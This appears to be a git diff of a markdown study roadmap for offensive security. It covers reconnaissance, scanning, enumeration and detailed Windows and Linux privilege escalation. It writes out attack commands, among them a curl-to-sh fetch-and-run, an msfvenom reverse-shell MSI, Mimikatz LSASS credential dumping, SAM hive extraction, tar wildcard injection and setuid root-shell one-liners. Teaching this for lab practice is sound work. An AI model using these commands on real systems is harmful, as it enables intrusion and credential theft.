@@ -1,14 +1,16 @@
-# Phase 2: Offensive Core
++# Phase 2: Offensive Core
 
 ---
 
 ### 🧭 Navigation
+
 ◀ [Phase 1](Phase-1.md) | 🏠 [Master Roadmap](README.md) | [Phase 3](Phase-3.md) ➔
 
 ---
 
 > [!NOTE]
 > **Phase Overview**
+>
 > - **⏱️ Time Commitment (Full-Time):** 5–7 months
 > - **⏱️ Time Commitment (Part-Time):** 8–12 months
 > - **🎯 Primary Focus:** The complete offensive lifecycle from recon to impact. Split into two sub-phases: **Phase 2A** (Offensive Fundamentals — recon, scanning, enumeration, credential attacks, system hacking) and **Phase 2B** (Advanced Offensive Operations — malware, sniffing/spoofing, social engineering, denial-of-service, session hijacking).
@@ -16,8 +18,11 @@
 ---
 
 > [!NOTE]
+>
 > ### 📝 Phase 2 Documentation Requirements
+>
 > Every attack you execute must be documented. Required artifacts:
+>
 > - **Pentest notes** in structured markdown (target → recon → exploitation → post-exploitation → findings)
 > - **Tool output** — Nmap scans, Burp captures, Metasploit session logs saved to files
 > - **Attack chain diagrams** showing the kill chain for each compromise
@@ -29,6 +34,7 @@
 ---
 
 ### 🗂️ Table of Contents
+
 - [Part 4: Footprinting and Reconnaissance](#part-4-footprinting-and-reconnaissance)
   - [Stage 1: The "Ghost" Phase (Passive OSINT & Human Profiling)](#part-4-stage-1-ghost-phase)
   - [Stage 2: Semi-Passive Infrastructure Mapping](#part-4-stage-2-semi-passive-infrastructure-mapping)
@@ -42,7 +48,8 @@
 - [Part 5: Scanning](#part-5-scanning)
   - [Stage 1: Host Discovery & Network Topology (The "Roll Call")](#stage-1-host-discovery-network-topology-the-roll-call)
   - [Stage 2: Port, Service & Protocol Enumeration (The "Door Check")](#stage-2-port-service-protocol-enumeration-the-door-check)
-  - [Stage 3: Defense & Configuration Assessment (The "Armor Check")](#stage-3-defense-configuration-assessment-the-armor-check)
+  - [Stage 3: Defense & Co
+    nfiguration Assessment (The "Armor Check")](#stage-3-defense-configuration-assessment-the-armor-check)
   - [Stage 4: Vulnerability Association & Attack Mapping](#stage-4-vulnerability-association-attack-mapping)
   - [Stage 5: Stealth & Evasion Techniques](#stage-5-stealth-evasion-techniques)
   - [Stage 6: Advanced Scanning Techniques](#stage-6-advanced-scanning-techniques)
@@ -110,9 +117,11 @@
 ---
 
 <a id="part-4-footprinting-and-reconnaissance"></a>
+
 ## Part 4: Footprinting and Reconnaissance
 
 <a id="part-4-stage-1-ghost-phase"></a>
+
 ### **Stage 1: The "Ghost" Phase (Passive OSINT & Human Profiling)**
 
 > [!TIP]
@@ -139,6 +148,7 @@
 ---
 
 <a id="part-4-stage-2-semi-passive-infrastructure-mapping"></a>
+
 ### **Stage 2: Semi-Passive Infrastructure Mapping**
 
 > [!TIP]
@@ -159,6 +169,7 @@
 ---
 
 <a id="part-4-stage-3-active-footprinting-network-interrogation"></a>
+
 ### **Stage 3: Active Footprinting & Network Interrogation**
 
 > [!TIP]
@@ -181,6 +192,7 @@
 ---
 
 <a id="part-4-stage-4-advanced-fingerprinting-logic-analysis"></a>
+
 ### **Stage 4: Advanced Fingerprinting & Logic Analysis**
 
 > [!TIP]
@@ -197,6 +209,7 @@
 ---
 
 <a id="part-4-stage-5-ipv6-protocol-enumeration"></a>
+
 ### **Stage 5: IPv6 & Protocol Enumeration**
 
 > [!TIP]
@@ -219,6 +232,7 @@
 ---
 
 <a id="part-4-stage-6-dark-web-breach-intelligence"></a>
+
 ### **Stage 6: Dark Web & Breach Intelligence**
 
 > [!TIP]
@@ -237,22 +251,32 @@
 ---
 
 <a id="part-4-stage-7-satellite-geospatial-intelligence"></a>
+
 ### **Stage 7: Satellite & Geospatial Intelligence**
 
 > [!TIP]
 > **Goal:** Use geospatial data to understand physical assets and infrastructure.
 
-- [ ] **Satellite Imagery:** Use **Google Earth Pro, Sentinel Hub, USGS** to visualize **data center locations, server rooms, facility security**.
+> [!NOTE]
+> **Scope Clarification — This Stage vs. Phase 5 SDR/GPS:**
+> This stage covers **passive OSINT using publicly available satellite imagery and geospatial data** — no special hardware required, no restricted frequencies, no legal complexity. Tools like Google Earth Pro, Sentinel Hub, and IP geolocation are legitimate free resources used by security consultants for physical site reconnaissance.
+>
+> This is **entirely distinct** from Phase 5 Stage 7 (GPS Spoofing & Satellite Protocol Security), which is marked **[OPTIONAL]** because it requires specialized hardware (HackRF, GPSDO), operates in restricted RF spectrum, and is a narrow specialization relevant only to specific career paths (aviation security, IoT/V2X, critical infrastructure). If you see the word "satellite" in Phase 5 and think you already covered it here — you have not. These are different domains.
 
-- [ ] **Geolocation Triangulation:** Combine **IP geolocation, BGP origin, ASN info** to identify **likely hosting providers and data center countries**.
+- [ ] **Satellite Imagery:** Use **Google Earth Pro, Sentinel Hub, USGS Earth Explorer, Maxar Open Data** to visualize **data center locations, server rooms, facility perimeters, parking patterns, physical security posture** — all from open, publicly available imagery.
 
-- [ ] **Signal Intelligence (SIGINT):** Use **RF mapping tools (Shodan, GreyNoise)** to identify **telecommunications infrastructure, cell towers, transmission sites**.
+- [ ] **Physical Facility Assessment via OSINT:** Combine satellite imagery with **LinkedIn employee location data, job postings (mentioning physical location), Google Street View, and building permit records** to map the physical attack surface of a target facility before an authorized physical pentest engagement.
+
+- [ ] **Geolocation Triangulation:** Combine **IP geolocation, BGP origin, ASN info** to identify **likely hosting providers and data center countries**. Use **ipinfo.io, bgp.he.net, PeeringDB** to map provider relationships.
+
+- [ ] **Signal Intelligence (SIGINT) — Passive Only:** Use **RF mapping tools (Wigle.net for WiFi mapping, Shodan for internet-exposed infrastructure, GreyNoise for internet noise)** to identify **telecommunications infrastructure** from open data sources — no hardware required.
 
 - [ ] **Infrastructure Clustering:** Map **AS numbers, IP blocks, DNS servers** to identify **shared hosting clusters, CDN nodes, provider boundaries**.
 
 ---
 
 <a id="part-4-stage-8-strategy-attack-mapping"></a>
+
 ### **Stage 8: Strategy & Attack Mapping**
 
 > [!TIP]
@@ -267,15 +291,16 @@
 ---
 
 <a id="part-4-lab-progression"></a>
+
 ### **Lab Progression (Part 4: Footprinting and Reconnaissance)**
 
-| Level | Task | Deliverable |
-|-------|------|-------------|
-| 1 | Perform passive recon on a bug bounty target using only OSINT tools | Reconnaissance report (domains, subdomains, emails, tech stack) |
-| 2 | Use Google Dorks to find exposed files on a permitted target | Dork queries + findings document |
-| 3 | Enumerate subdomains using 3+ tools (Sublist3r, Amass, crt.sh) | Combined subdomain list with deduplication |
-| 4 | Map a target's full DNS infrastructure (MX, NS, TXT, CNAME) | DNS map diagram |
-| 5 | Perform active recon on a home lab target (traceroute, banner grabbing) | Active recon report |
+| Level | Task                                                                    | Deliverable                                                     |
+| ----- | ----------------------------------------------------------------------- | --------------------------------------------------------------- |
+| 1     | Perform passive recon on a bug bounty target using only OSINT tools     | Reconnaissance report (domains, subdomains, emails, tech stack) |
+| 2     | Use Google Dorks to find exposed files on a permitted target            | Dork queries + findings document                                |
+| 3     | Enumerate subdomains using 3+ tools (Sublist3r, Amass, crt.sh)          | Combined subdomain list with deduplication                      |
+| 4     | Map a target's full DNS infrastructure (MX, NS, TXT, CNAME)             | DNS map diagram                                                 |
+| 5     | Perform active recon on a home lab target (traceroute, banner grabbing) | Active recon report                                             |
 
 > [!IMPORTANT]
 > **Move-On Gate:** You can produce a complete reconnaissance report on an unfamiliar target using both passive and active techniques, identify the technology stack, and prioritize attack surface areas.
@@ -284,9 +309,11 @@
 
 <a id="toc-part-5-scanning"></a>
 <a id="part-5-scanning"></a>
+
 ## Part 5: Scanning
 
 <a id="stage-1-host-discovery-network-topology-the-roll-call"></a>
+
 ### **Stage 1: Host Discovery & Network Topology (The "Roll Call")**
 
 > [!TIP]
@@ -305,6 +332,7 @@
 ---
 
 <a id="stage-2-port-service-protocol-enumeration-the-door-check"></a>
+
 ### **Stage 2: Port, Service & Protocol Enumeration (The "Door Check")**
 
 > [!TIP]
@@ -327,6 +355,7 @@
 ---
 
 <a id="stage-3-defense-configuration-assessment-the-armor-check"></a>
+
 ### **Stage 3: Defense & Configuration Assessment (The "Armor Check")**
 
 > [!TIP]
@@ -343,6 +372,7 @@
 ---
 
 <a id="stage-4-vulnerability-association-attack-mapping"></a>
+
 ### **Stage 4: Vulnerability Association & Attack Mapping**
 
 > [!TIP]
@@ -361,6 +391,7 @@
 ---
 
 <a id="stage-5-stealth-evasion-techniques"></a>
+
 ### **Stage 5: Stealth & Evasion Techniques**
 
 > [!TIP]
@@ -383,6 +414,7 @@
 ---
 
 <a id="stage-6-advanced-scanning-techniques"></a>
+
 ### **Stage 6: Advanced Scanning Techniques**
 
 > [!TIP]
@@ -401,15 +433,16 @@
 - [ ] **Proxychains & Proxy Pivoting:** Route scans through **VPNs, proxies, compromised hosts** to obscure source IP and bypass **geographic restrictions**.
 
 <a id="lab-progression-part-5-scanning"></a>
+
 ### **Lab Progression (Part 5: Scanning)**
 
-| Level | Task | Deliverable |
-|-------|------|-------------|
-| 1 | Scan a home lab subnet with Nmap (host discovery + port scan) | Nmap output report |
-| 2 | Perform service version detection and OS fingerprinting | Annotated scan results |
-| 3 | Write a custom NSE script to detect a specific vulnerability | Working .nse script |
-| 4 | Scan a target through a proxy chain / VPN tunnel | Scan results + stealth analysis |
-| 5 | Compare scan results with and without IDS evasion techniques | Evasion effectiveness report |
+| Level | Task                                                          | Deliverable                     |
+| ----- | ------------------------------------------------------------- | ------------------------------- |
+| 1     | Scan a home lab subnet with Nmap (host discovery + port scan) | Nmap output report              |
+| 2     | Perform service version detection and OS fingerprinting       | Annotated scan results          |
+| 3     | Write a custom NSE script to detect a specific vulnerability  | Working .nse script             |
+| 4     | Scan a target through a proxy chain / VPN tunnel              | Scan results + stealth analysis |
+| 5     | Compare scan results with and without IDS evasion techniques  | Evasion effectiveness report    |
 
 > [!IMPORTANT]
 > **Move-On Gate:** You can discover all live hosts and open ports on a /24 subnet, identify service versions and OS types, and adapt scan techniques to evade basic IDS detection.
@@ -418,12 +451,14 @@
 
 <a id="toc-part-6-enumeration"></a>
 <a id="part-6-enumeration"></a>
+
 ## Part 6: Enumeration
 
 > [!NOTE]
 > **Note:** Part 5 (Scanning) covers host discovery, port scanning, and defense identification. Part 6 focuses specifically on **extracting detailed information from discovered services** to build an attack profile. If you haven't completed Part 5, do so first.
 
 <a id="stage-1-service-enumeration-banner-grabbing"></a>
+
 ### **Stage 1: Service Enumeration & Banner Grabbing**
 
 > [!TIP]
@@ -444,6 +479,7 @@
 ---
 
 <a id="stage-2-directory-identity-enumeration"></a>
+
 ### **Stage 2: Directory & Identity Enumeration**
 
 > [!TIP]
@@ -462,6 +498,7 @@
 ---
 
 <a id="stage-3-dns-infrastructure-enumeration"></a>
+
 ### **Stage 3: DNS & Infrastructure Enumeration**
 
 > [!TIP]
@@ -478,6 +515,7 @@
 ---
 
 <a id="stage-4-database-application-enumeration"></a>
+
 ### **Stage 4: Database & Application Enumeration**
 
 > [!TIP]
@@ -496,6 +534,7 @@
 ---
 
 <a id="stage-5-attack-surface-consolidation-enumeration-opsec"></a>
+
 ### **Stage 5: Attack Surface Consolidation & Enumeration OpSec**
 
 > [!TIP]
@@ -512,15 +551,16 @@
 - [ ] **Documentation:** Record all findings with **timestamps, source IPs, and tool commands** used — this feeds directly into **reporting and evidence collection**.
 
 <a id="lab-progression-part-6-enumeration"></a>
+
 ### **Lab Progression (Part 6: Enumeration)**
 
-| Level | Task | Deliverable |
-|-------|------|-------------|
-| 1 | Enumerate SMB shares and users on a Windows lab target | Enumeration findings document |
-| 2 | Enumerate SNMP on a network device (community strings, MIBs) | SNMP data export |
-| 3 | Perform full LDAP enumeration against a lab AD domain | User/group/OU listing |
-| 4 | Enumerate DNS zone transfers and subdomain brute-forcing | DNS enumeration report |
-| 5 | Build a complete attack surface map from enumeration data | Attack profile document with prioritized paths |
+| Level | Task                                                         | Deliverable                                    |
+| ----- | ------------------------------------------------------------ | ---------------------------------------------- |
+| 1     | Enumerate SMB shares and users on a Windows lab target       | Enumeration findings document                  |
+| 2     | Enumerate SNMP on a network device (community strings, MIBs) | SNMP data export                               |
+| 3     | Perform full LDAP enumeration against a lab AD domain        | User/group/OU listing                          |
+| 4     | Enumerate DNS zone transfers and subdomain brute-forcing     | DNS enumeration report                         |
+| 5     | Build a complete attack surface map from enumeration data    | Attack profile document with prioritized paths |
 
 > [!IMPORTANT]
 > **Move-On Gate:** You can enumerate services, users, shares, and misconfigurations across SMB, LDAP, SNMP, DNS, and web services, and produce a prioritized attack surface map.
@@ -528,9 +568,14 @@
 ---
 
 <a id="part-31-password-cracking-hash-analysis"></a>
+
 ## Part 31: Password Cracking & Hash Analysis
 
+> [!NOTE]
+> **Navigational Note — Why Part 31 Is Here:** Part 31 is numbered non-sequentially (Parts 4–6, then 31, then 7–...) because it was added to Phase 2 after the original numbering scheme was established. It sits here — between Part 6 (Enumeration) and Part 7 (System Hacking) — because password cracking is a **direct prerequisite for Part 7**: you cannot use Pass-the-Hash, Kerberoasting, or credential-based lateral movement without first understanding hash types, cracking methodology, and offline attack mechanics. Parts 8–30 do not exist in Phase 2 — they are in later phases. Continue to Part 7 after completing this.
+
 <a id="stage-1-hash-identification-acquisition"></a>
+
 ### **Stage 1: Hash Identification & Acquisition**
 
 > [!TIP]
@@ -545,6 +590,7 @@
 ---
 
 <a id="stage-2-cracking-methodology-tools"></a>
+
 ### **Stage 2: Cracking Methodology & Tools**
 
 > [!TIP]
@@ -567,6 +613,7 @@
 ---
 
 <a id="stage-3-protocol-specific-cracking"></a>
+
 ### **Stage 3: Protocol-Specific Cracking**
 
 > [!TIP]
@@ -585,6 +632,7 @@
 ---
 
 <a id="stage-4-wordlist-intelligence-curation"></a>
+
 ### **Stage 4: Wordlist & Intelligence Curation**
 
 > [!TIP]
@@ -604,9 +652,11 @@
 
 <a id="toc-part-7-system-hacking--initial-compromise"></a>
 <a id="part-7-system-hacking-initial-compromise"></a>
+
 ## Part 7: System Hacking & Initial Compromise
 
 <a id="stage-1-the-breach-initial-access-exploitation"></a>
+
 ### **Stage 1: The Breach (Initial Access & Exploitation)**
 
 > [!TIP]
@@ -673,6 +723,7 @@
 ---
 
 <a id="stage-2-the-ascension-privilege-escalation"></a>
+
 ### **Stage 2: The Ascension (Privilege Escalation)**
 
 > [!TIP]
@@ -680,17 +731,135 @@
 
 **Windows Privilege Escalation:**
 
-- [ ] **UAC Bypass:** Exploit **COM elevation, DLL hijack, token impersonation** to bypass **User Account Control**.
+> [!IMPORTANT]
+> **Why This Needs Its Own Methodology:** Windows is the dominant enterprise OS. Every red team engagement involves Windows privilege escalation. The six bullets below from the original stub are insufficient — work through each vector with a dedicated lab VM (TryHackMe "Windows PrivEsc" room, HackTheBox Blue/Optimum/Bastard, or build your own intentional misfig VM). **winPEAS** and **PowerUp** automate discovery — but you must understand every finding manually before relying on automation.
 
-- [ ] **Service Misconfigs:** Abuse **weak service permissions, unquoted paths, service binaries** for **privilege hijack**.
+**Step 0 — Enumeration (Always First):**
 
-- [ ] **Token Impersonation:** Steal **delegation tokens** from services to impersonate **SYSTEM/Domain Admin**.
+- [ ] **Automated Enumeration:** Run **winPEAS** (`winpeas.exe`) — read every orange and red finding; do not blindly exploit suggestions. Also run **PowerUp** (`Import-Module PowerUp.ps1; Invoke-AllChecks`) for PowerShell-based checks, and **Seatbelt** for host situational awareness (token privileges, installed software, AppLocker policy).
 
-- [ ] **DLL/DLL-Proxying:** Hijack **DLL search order** or use **sideloading** to execute arbitrary code at higher privilege.
+- [ ] **Manual Baseline Commands:** On foothold, immediately run:
+  - `whoami /priv` — check token privileges (SeImpersonatePrivilege, SeDebugPrivilege, SeBackupPrivilege are all exploitable)
+  - `whoami /groups` — identify group memberships and integrity level
+  - `net user %username%` — full user attributes, password expiry, group membership
+  - `systeminfo | findstr /i "os name os version hotfix"` — OS version and installed patches
+  - `wmic qfe get hotfixid` — list all patches; cross-reference with missing-patch exploit databases
+  - `sc query` — enumerate all running services
+  - `tasklist /svc` — processes with associated services
+  - `netstat -ano` — active network connections and PIDs (identify locally-listening services)
+  - `schtasks /query /fo LIST /v` — all scheduled tasks with owners and paths
 
-- [ ] **Kernel Exploitation:** Target **unpatched zero-days** (MS21-1234) for **kernel-level code execution**.
+**Vector 1: Service Misconfigurations**
 
-- [ ] **Group Policy Exploitation:** Abuse **GPP passwords, startup scripts, scheduled tasks** for **privilege gain**.
+- [ ] **Unquoted Service Paths:** When a service binary path contains spaces and is unquoted (e.g., `C:\Program Files\Vuln App\service.exe`), Windows will try `C:\Program.exe` first. If you can write to any parent directory, drop a malicious `Program.exe` to escalate.
+  - Discovery: `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"`
+  - Also: PowerUp `Get-UnquotedService`
+
+- [ ] **Weak Service Binary Permissions:** If you can overwrite the service binary itself, replace it with a payload.
+  - Discovery: `icacls "C:\path\to\service.exe"` — look for `(W)` or `(F)` for current user or Everyone group
+
+- [ ] **Weak Service Registry Permissions:** Registry key controlling a service's image path. If writable, change the binary path.
+  - Discovery: `Get-ACL "HKLM:\System\CurrentControlSet\Services\VulnSvc"`
+
+**Vector 2: DLL Hijacking**
+
+- [ ] **DLL Search Order Abuse:** When an application loads a DLL by name without an absolute path, Windows searches: application directory → `%SYSTEMROOT%\System32` → `%SYSTEMROOT%` → directories in `%PATH%`. If you can write to a directory searched before the legitimate DLL location, drop a malicious DLL with the same name.
+  - Discovery: **Procmon** (Sysinternals) — filter by `Result = NAME NOT FOUND` + `Path ends with .dll` while running the target application to find missing DLLs
+
+- [ ] **DLL Proxying:** Place a malicious DLL that loads the real DLL and also executes a payload — allows transparent hijack without breaking application functionality.
+
+- [ ] **Side-Loading:** High-privileged applications loading DLLs from user-writable locations. Common in enterprise software that runs as SYSTEM but loads plugins from user directories.
+
+**Vector 3: Token Impersonation & Potato Exploits**
+
+- [ ] **SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege:** These privileges (held by IIS service accounts, SQL Server service, local service) allow impersonating any token, including SYSTEM. This is the most common path from `NT AUTHORITY\NETWORK SERVICE` → SYSTEM.
+  - **PrintSpoofer** (Windows 10/2019+): `PrintSpoofer.exe -i -c powershell.exe`
+  - **JuicyPotato** (Windows Server 2016 and below): requires a CLSID for a COM server running as SYSTEM
+  - **GodPotato** (Windows 2012–2022, all versions): `GodPotato.exe -cmd "cmd /c whoami > C:\result.txt"`
+  - **RoguePotato**: Works when JuicyPotato CLSID restrictions apply
+  - Discovery: `whoami /priv` → look for `SeImpersonatePrivilege Enabled`
+
+- [ ] **Token Duplication (SeDebugPrivilege):** With `SeDebugPrivilege`, open any process including LSASS and winlogon.exe, steal their tokens, and impersonate SYSTEM.
+  - Tools: `incognito.exe`, Meterpreter `getsystem`
+
+**Vector 4: UAC Bypass**
+
+- [ ] **UAC Mechanism:** User Account Control elevates processes that request it. Only processes with an auto-elevation manifest bypass the UAC prompt. Most UAC bypass techniques involve abusing auto-elevated trusted Windows binaries.
+
+- [ ] **Technique Examples (Enumerated by UACME Project):**
+  - `fodhelper.exe` bypass (Method 33): modify `HKCU\Software\Classes\ms-settings\shell\open\command` registry key — auto-elevated binary loads the key with no prompt
+  - `eventvwr.exe` bypass (Method 32): similar registry hijack under `HKCU\Software\Classes\mscfile\shell\open\command`
+  - `sdclt.exe` bypass (Method 45): uses `HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths`
+  - Discovery: UACME project lists 60+ UAC bypass methods by Windows version
+  - Detection signature: Look for HKCU registry keys being written before auto-elevated binary execution in Sysmon Event ID 13
+
+- [ ] **UAC Level Check:** `REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA` — UAC is disabled if `EnableLUA = 0` (no bypass needed); confirm with `REG QUERY ... /v ConsentPromptBehaviorAdmin` (value 0 = never prompt = bypass trivial)
+
+**Vector 5: Registry Privilege Abuse**
+
+- [ ] **AlwaysInstallElevated:** If both `HKLM` and `HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` are set to 1, any `.msi` package can be installed as SYSTEM.
+  - Discovery: PowerUp `Get-RegistryAlwaysInstallElevated`
+  - Exploit: `msfvenom -p windows/x64/shell_reverse_tcp ... -f msi > malicious.msi; msiexec /quiet /qn /i malicious.msi`
+
+- [ ] **AutoRun Keys (Persistence → Escalation on Higher-Privilege Login):** Write a payload to a registry run key executed by a higher-privilege user:
+  - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` — requires admin write access but runs for all users
+  - `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` — no special permission, runs as current user (useful for phishing context)
+
+**Vector 6: Scheduled Task Exploitation**
+
+- [ ] **Writable Task Binary:** If a scheduled task runs as SYSTEM but the binary it executes is writable by your user, replace the binary.
+  - Discovery: `schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As User\|Status"`
+  - Then: `icacls "C:\path\to\task\binary.exe"` — check write permission
+
+- [ ] **Task XML Privilege Escalation:** Some tasks stored in `C:\Windows\System32\Tasks\` have weak ACLs — check the task XML directly for the `<RunAs>` element.
+
+- [ ] **Writable Task Directory:** If the task binary isn't present but you can write to its expected path, create the binary there — it will run as SYSTEM on the next scheduled execution.
+
+**Vector 7: Credential Hunting**
+
+- [ ] **SAM/SYSTEM/SECURITY Registry Hives:** On a live system, these are locked. In offline access (or via shadow copies), extract NTLM hashes:
+  - `reg save HKLM\SAM C:\sam.hive` + `reg save HKLM\SYSTEM C:\system.hive` → `secretsdump.py -sam sam.hive -system system.hive LOCAL`
+  - Or from shadow copy: `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\sam.hive`
+
+- [ ] **LSASS Memory Dump:** Dump credentials from LSASS for logged-in accounts (requires SYSTEM or SeDebugPrivilege):
+  - `procdump.exe -accepteula -ma lsass.exe lsass.dmp` → parse offline with **Mimikatz** `sekurlsa::minidump lsass.dmp; sekurlsa::logonpasswords`
+  - Mimikatz direct: `privilege::debug; sekurlsa::logonpasswords`
+  - Detection: Event ID 4656 (handle to LSASS), Sysmon Event ID 10 (process access)
+
+- [ ] **Credential Manager & DPAPI:** `cmdkey /list` — cached credentials; `vaultcmd /listcreds:"Windows Credentials"`. Decrypt DPAPI blobs with Mimikatz `dpapi::cred` using masterkey.
+
+- [ ] **Configuration File Credential Hunting:**
+  - `findstr /si password *.txt *.xml *.ini *.config *.ps1 *.bat`
+  - `dir /s /b *pass* *cred* *vnc* *.config 2>nul`
+  - `%windir%\Panther\Unattend.xml` — contains base64-encoded admin passwords from OS deployment
+  - `C:\inetpub\wwwroot\web.config` — database connection strings often contain cleartext credentials
+  - PowerShell history: `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
+
+**Vector 8: Kernel & Windows Component Exploits**
+
+- [ ] **Kernel Exploit Identification:** Check OS version (`systeminfo`) against known public kernel privilege escalation exploits. Priority targets:
+  - **MS16-032** (Secondary Logon, Windows 7–10): token impersonation via race condition
+  - **MS16-075** (Potato, Windows Vista–2016): NTLM relay to local system
+  - **HiveNightmare/SeriousSam** (CVE-2021-36934, Windows 10 21H1+): any user can read SAM hive
+  - **PrintNightmare** (CVE-2021-34527): Windows Print Spooler code execution as SYSTEM
+
+- [ ] **Exploit Suggester:** After `systeminfo`, paste output into **Windows-Exploit-Suggester-NG** (`wesng.py`): `python wesng.py --update; python wesng.py systeminfo.txt` — cross-references patches against known CVEs.
+
+**Windows Privesc Lab Targets:**
+
+> [!TIP]
+> Work through these in order. Each machine reinforces specific vectors with different difficulty.
+
+| Machine         | Platform    | Primary Vectors                          | Key Learning                       |
+| --------------- | ----------- | ---------------------------------------- | ---------------------------------- |
+| Blue            | HackTheBox  | MS17-010 (EternalBlue)                   | RCE → SYSTEM via kernel exploit    |
+| Optimum         | HackTheBox  | HFS RCE → MS16-032                       | Exploit suggester workflow         |
+| Bastard         | HackTheBox  | Drupal RCE → token impersonation         | SeImpersonatePrivilege path        |
+| Windows PrivEsc | TryHackMe   | Service misconfigs, registry, DLL hijack | Structured privesc methodology     |
+| Steel Mountain  | TryHackMe   | HFS → PowerUp → unquoted path            | Guided Windows privesc walkthrough |
+| Alfred          | TryHackMe   | Jenkins → token impersonation            | JuicyPotato/Incognito              |
+| Retro           | HackTheBox  | CVE research + credential hunting        | Manual credential discovery        |
+| AccessChk       | Personal VM | Custom misconfigs                        | Build your own vuln lab            |
 
 **Active Directory Attacks:**
 
@@ -710,15 +879,114 @@
 
 **Linux Privilege Escalation:**
 
-- [ ] **setuid/setgid Abuse:** Exploit **vulnerable SUID binaries** (vim, cp, find) with **PATH manipulation**.
+> [!IMPORTANT]
+> **Why This Needs Its Own Methodology:** Linux privesc is the most consistently tested domain on OSCP, HTB, and real-world Linux engagements. The five bullets below are not enough. Work through each vector with a dedicated lab VM (try Tryhackme "Linux PrivEsc" room, HackTheBox Jarvis/Sunday, or build your own with intentional misconfigs). **LinPEAS** and **Linux Smart Enumeration (lse.sh)** automate discovery — but you must understand every finding manually before relying on automation.
 
-- [ ] **Capabilities Abuse:** Abuse **CAP_SETUID/CAP_SYS_ADMIN** for **shell execution as root**.
+**Step 0 — Enumeration (Always First):**
 
-- [ ] **sudo Misconfigs:** Leverage **sudoers entries** (NOPASSWD, wildcard paths) for **privilege escalation**.
+- [ ] **Manual Baseline:** On foothold, immediately run: `id`, `whoami`, `hostname`, `uname -a`, `cat /etc/os-release`, `cat /proc/version`, `env`, `sudo -l`, `cat /etc/crontab`, `ls -la /etc/cron.*`, `find / -perm -4000 -type f 2>/dev/null` (SUID), `find / -perm -2000 -type f 2>/dev/null` (SGID).
 
-- [ ] **Kernel LPE:** Exploit **unpatched kernel vulnerabilities** (dirty cow, CVE-2016-5195) for **root shell**.
+- [ ] **Automated Tools:** Run **LinPEAS** (`curl -L https://linpeas.sh | sh`) and **linux-exploit-suggester-2** (`les2.sh`) — read every finding, do not blindly run suggested exploits.
 
-- [ ] **Cron/Systemd Abuse:** Hijack **cron jobs, systemd timers, .timer files** for **privilege execution**.
+- [ ] **Writable Paths:** Check `find / -writable -type f 2>/dev/null | grep -v proc` — writable files owned by root or executed by root cron jobs are high-value targets.
+
+**Vector 1 — SUID/SGID Binary Abuse:**
+
+- [ ] **Mechanism:** Files with the SUID bit set execute as their owner (usually root) rather than the calling user. Any vulnerability in the program, or any supported feature that spawns a shell or writes files, becomes a root escalation.
+
+- [ ] **Discovery:** `find / -perm -4000 -type f 2>/dev/null` — list every SUID binary on the system. Cross-reference each against **GTFOBins** (`https://gtfobins.github.io`) for known escape techniques.
+
+- [ ] **Common Exploitable Binaries:** `find`, `vim`, `nano`, `cp`, `mv`, `bash`, `python`, `perl`, `awk`, `nmap` (older versions), `env`, `less`, `more`, `man`, `ftp`, `screen`.
+
+- [ ] **PATH Hijacking:** If a SUID binary calls another program using a relative path (e.g., `system("service apache2 start")` without full path), prepend a writable directory to `$PATH` containing a malicious `service` binary.
+
+- [ ] **Shared Object Injection:** If `strace`/`ltrace` shows a SUID binary loading a missing `.so` file from a writable directory, compile a malicious shared object and place it there.
+
+**Vector 2 — sudo Misconfiguration:**
+
+- [ ] **Discovery:** `sudo -l` — lists what the current user can run as root (or other users) without a password or with one.
+
+- [ ] **NOPASSWD Rules:** Any binary listed under `NOPASSWD` is an immediate escalation — check GTFOBins for the exact `sudo` escape method.
+
+- [ ] **Wildcard Abuse:** `sudo /usr/bin/zip *` — if a wildcard is present and the binary interprets arguments as filenames, inject `--unzip-command=sh -c /bin/bash` or similar via specially named files.
+
+- [ ] **LD_PRELOAD Injection:** If `sudo -l` shows `env_keep+=LD_PRELOAD`, compile a malicious shared library and set `sudo LD_PRELOAD=/tmp/evil.so <allowed_program>` to execute code as root before the real program.
+
+- [ ] **Shell Escape via sudo:** Programs that run editors, pagers, or shells (vim, less, more, man, awk, perl, python) frequently allow shell escapes — check GTFOBins for the specific invocation syntax under `sudo`.
+
+**Vector 3 — Cron Job Abuse:**
+
+- [ ] **Discovery:** `cat /etc/crontab`, `ls -la /etc/cron.*`, `crontab -l`, `find / -name "*cron*" 2>/dev/null`, `systemctl list-timers` (systemd). Also monitor `/var/log/syslog` or `/var/log/cron` to identify jobs not visible in standard config files.
+
+- [ ] **Writable Script Hijack:** If a root-owned cron job executes a script that you can write to, replace or append to the script with a reverse shell or setuid bash copy.
+
+- [ ] **Writable Directory in PATH:** If a root cron job calls a binary using a relative name and the cron `PATH` variable includes a directory you can write to, place a malicious binary with the same name in that directory.
+
+- [ ] **Wildcard Injection (cron + tar):** `tar czf /backup.tar.gz /tmp/*` run by root — create files named `--checkpoint=1` and `--checkpoint-action=exec=sh evil.sh` in `/tmp` to inject arbitrary command execution.
+
+- [ ] **Systemd Timers:** Check `systemctl list-timers --all` and inspect the associated `.service` files with `systemctl cat <service>`. If the `ExecStart` path is writable, hijack it.
+
+**Vector 4 — Linux Capabilities Abuse:**
+
+- [ ] **Mechanism:** Linux capabilities divide root privileges into granular units. A binary granted `cap_setuid` can change its UID to 0 without being SUID. This is invisible to standard SUID searches.
+
+- [ ] **Discovery:** `getcap -r / 2>/dev/null` — lists all binaries with assigned capabilities.
+
+- [ ] **High-Value Capabilities:** `cap_setuid+ep`, `cap_net_bind_service+ep`, `cap_net_raw+ep`, `cap_sys_admin+ep`, `cap_dac_override+ep` (override DAC permissions on any file).
+
+- [ ] **Python with cap_setuid:** `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
+
+- [ ] **Perl with cap_setuid:** `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'`
+
+**Vector 5 — Writable Files & PATH Hijacking:**
+
